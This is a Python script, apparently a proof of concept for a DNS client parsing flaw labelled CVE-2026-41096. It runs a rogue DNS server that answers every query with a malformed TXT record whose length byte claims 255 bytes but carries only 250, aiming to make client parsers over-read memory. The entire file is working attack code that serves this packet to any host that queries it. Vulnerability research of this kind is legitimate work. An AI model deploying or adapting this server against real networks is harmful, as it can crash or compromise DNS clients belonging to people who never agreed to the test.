#!/usr/bin/env python3
import socket
import struct
import argparse
import sys

def build_malicious_response(auth_id, query_name):
    """
    Constructs a DNS response with a malformed TXT record to test 
    buffer limits in the client-side parser.
    """
    # Header: Response, No Error, 1 Answer
    header = struct.pack("!HHHHHH", auth_id, 0x8180, 1, 1, 0, 0)
    
    # Echoing the question section
    question = query_name + struct.pack("!HH", 16, 1) # TXT, IN
    
    # Answer Section
    ans_name = b'\xc0\x0c' # Pointer to query name
    ans_type = 0x0010      # TXT
    ans_class = 0x0001     # IN
    ans_ttl = 60
    
    # Malformed RDATA: Testing 255-byte boundary
    # We provide a length byte that might conflict with the total RDLENGTH
    payload = b"A" * 250 
    txt_data = struct.pack("!B", 255) + payload # Potential overread
    
    rd_length = len(txt_data)
    answer = ans_name + struct.pack("!HHIH", ans_type, ans_class, ans_ttl, rd_length) + txt_data
    
    return header + question + answer

def main():
    parser = argparse.ArgumentParser(description="CVE-2026-41096 Research Tool")
    parser.add_argument("--ip", default="0.0.0.0", help="Listening IP")
    parser.add_argument("--port", type=int, default=53, help="Listening Port")
    args = parser.parse_args()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind((args.ip, args.port))
        print(f"[*] DNS Research Server active on {args.ip}:{args.port}")
    except PermissionError:
        print("[-] Error: Permission denied. Run as root/admin.")
        sys.exit(1)

    while True:
        try:
            data, addr = sock.recvfrom(1024)
            tx_id = struct.unpack("!H", data[:2])[0]
            # Simple QNAME extraction for the response
            q_end = data[12:].find(b'\x00') + 13
            q_name = data[12:q_end]
            
            print(f"[*] Query received from {addr[0]} | ID: {tx_id}")
            response = build_malicious_response(tx_id, q_name)
            sock.sendto(response, addr)
            print(f"[!] Research packet sent to {addr[0]}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
